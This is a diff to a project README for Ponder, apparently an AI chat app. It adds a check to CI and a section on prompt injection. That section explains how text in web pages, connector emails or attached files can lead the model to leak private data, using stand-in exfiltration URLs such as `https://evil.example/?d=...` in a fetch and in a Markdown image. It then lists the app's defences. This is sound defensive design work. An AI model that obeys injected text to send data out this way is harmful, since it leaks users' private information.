@@ -150,9 +150,9 @@ Then, with the app's environment:
 
 Two settings point Ponder at other servers, for the tests: `OPENROUTER_BASE_URL` (every OpenRouter call; default `https://openrouter.ai/api`) and `CLOUDFLARE_API_URL` (the email API). Production sets neither.
 
-Tests: `npm run e2e` builds Ponder and runs the end-to-end tests in a browser, with a fake OpenRouter in place of the real one, and test MCP servers for connectors. They need Docker for Postgres. See [`e2e/README.md`](e2e/README.md). CI runs them, the type checks and `server/mcp.check.ts` on every pull request.
+Tests: `npm run e2e` builds Ponder and runs the end-to-end tests in a browser, with a fake OpenRouter in place of the real one, and test MCP servers for connectors. They need Docker for Postgres. See [`e2e/README.md`](e2e/README.md). CI runs them, the type checks, `server/trusted-pages.check.ts` and `server/mcp.check.ts` on every pull request.
 
-Checks: `npm run typecheck` (web), `npm run typecheck:server`, `npm run typecheck:e2e`, `npx tsx server/context.check.ts`, `npx tsx server/memory.check.ts`, `npx tsx server/search.check.ts [--live]`, and `npx tsx server/mcp.check.ts [--live]` (with the app's environment; it writes two test people to the database and deletes them).
+Checks: `npm run typecheck` (web), `npm run typecheck:server`, `npm run typecheck:e2e`, `npx tsx server/context.check.ts`, `npx tsx server/memory.check.ts`, `npx tsx server/search.check.ts [--live]`, `npx tsx server/trusted-pages.check.ts`, and `npx tsx server/mcp.check.ts [--live]` (with the app's environment; it writes two test people to the database and deletes them).
 
 To try connectors locally, run `npx tsx server/mcp.check.ts --serve` (test MCP servers with no sign-in, an API key, and OAuth that signs in at once), and start Ponder with `MCP_ALLOW_PRIVATE_NETWORKS=1`.
 
@@ -235,7 +235,18 @@ The model sees two tools of our own (`server/search/schema.ts`), whatever runs t
 
 - `web_search`: a backend from `SEARCH_BACKEND` (`server/search/backend.ts`). The only one now is `openrouter`: a cheap model (`PONDER_SEARCH_MODEL`) makes one search with OpenRouter's `web_search` server tool on Exa, and its citations are the results. It needs no other API key. The model call goes to a Zero Data Retention endpoint, but Exa keeps queries by its own rules. For more privacy later: a search API with a zero-retention contract (Brave, Exa or Parallel enterprise) or a SearXNG we host, as one more backend.
 - `web_fetch`: reads the page on our own server (`server/search/fetch-page.ts`), so no other company sees it. It refuses every address on this machine, the tailnet and private networks, checked when each connection opens and on each redirect. Only ports 80 and 443; at most 3 MB and 20,000 characters of text.
+- `web_fetch` reads an address on its own only when the person wrote it in a message, a `web_search` in the chat returned it, or the person already let it read that page (`server/search/trusted-pages.ts`). Any other address waits for the person: the confirmation shows the whole address. Text in a page, a connector's result or an attached file can tell the model to put private data in an address, such as `https://evil.example/?d=...`, and the request itself would send it out. Addresses in attached files and in memory do not count as the person's.
 - Citations: the model cites with a Markdown link right after each fact. In the page, a link to a page that a search returned or `web_fetch` read shows as a small chip; hovering or focusing it shows the page's title and an excerpt.
+
+### Prompt injection
+
+A page, an email from a connector or an attached file can hold text that tells the model what to do. The model can't reliably tell that text from the person's, so Ponder does not rely on the model to ignore it. It closes the ways that private data could leave without the person seeing it:
+
+- Images: the app's pages have a Content Security Policy (`server/app.ts`) that loads images and media only from Ponder, `data:` and `blob:` URLs, and the CDNs an HTML artifact may use. A Markdown image in a reply, such as `![](https://evil.example/?d=...)`, would otherwise load as soon as the reply shows. Artifact frames are `srcdoc` frames, so they are held to this policy too, as well as their own.
+- `web_fetch`: asks first for an address that the person did not give and no search returned (see Web search).
+- Connector tools that change something are on "Ask first" by default, and Python has no network.
+
+What is left: a link in a reply can carry data when the person clicks it, and a `web_search` query goes to Exa.
 
 ### Connectors
 
